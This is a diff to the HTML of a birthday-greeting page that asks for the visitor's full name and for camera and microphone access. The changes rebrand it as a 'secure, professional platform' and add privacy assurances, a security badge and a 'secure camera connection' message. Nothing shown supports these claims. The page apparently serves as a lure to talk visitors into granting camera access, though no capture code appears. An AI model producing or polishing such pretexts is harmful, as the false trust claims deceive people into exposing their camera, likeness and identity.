@@ -3,33 +3,43 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Happy Birthday!</title>
+  <title>Birthday Celebration Platform | Secure & Professional</title>
   <link rel="stylesheet" href="birthday.css">
+  <meta name="description" content="Professional birthday celebration platform with secure photo capture and real-time sharing.">
 </head>
 <body>
   <main class="party">
     <div class="card" id="card">
       <div id="permOverlay" class="perm-overlay">
         <div class="perm-box">
-          <div class="camera-emoji">�</div>
-          <h3>Camera Access Required</h3>
-          <p>Please allow camera and microphone access to create your personalized birthday celebration experience.</p>
-          <button id="overlayRetryBtn">Grant Access</button>
+          <div class="camera-emoji">📸</div>
+          <h3>Camera Permission Required</h3>
+          <p>We need camera access to capture your special birthday moments. Your privacy is protected and no data is stored without your consent.</p>
+          <button id="overlayRetryBtn">Grant Camera Access</button>
         </div>
       </div>
-      <h1 id="title">🎉 Happy Birthday</h1>
+      
+      <div class="header-info">
+        <div class="trust-badge">🔒 Secure Platform</div>
+        <h1 id="title">Birthday Celebration</h1>
+        <p class="platform-subtitle">Professional celebration platform</p>
+      </div>
 
       <div id="stepName" class="step">
-        <label for="nameInput">Enter your name to begin</label>
-        <input id="nameInput" placeholder="Your name" />
-        <button id="startBtn">Start Celebration</button>
+        <label for="nameInput">Enter your name to begin your celebration</label>
+        <input id="nameInput" placeholder="Your full name" />
+        <button id="startBtn">Start My Celebration</button>
+        <div class="privacy-note">
+          <small>✓ Your information is secure and not shared with third parties</small>
+        </div>
       </div>
 
       <div id="greeting" class="step hidden">
         <h2 id="greetingText"></h2>
-        <p class="sub">May this special day bring you joy, laughter, and wonderful memories.</p>
-        <div id="cameraStatus" class="camera-status">Status: <span id="cameraMessage">Preparing your celebration...</span>
-          <button id="retryPermBtn" class="small hidden">Retry Access</button>
+        <p class="sub">Welcome to your personalized birthday celebration experience.</p>
+        <div id="cameraStatus" class="camera-status">
+          <span id="cameraMessage">Initializing secure camera connection...</span>
+          <button id="retryPermBtn" class="small hidden">Retry Connection</button>
         </div>
       </div>
 
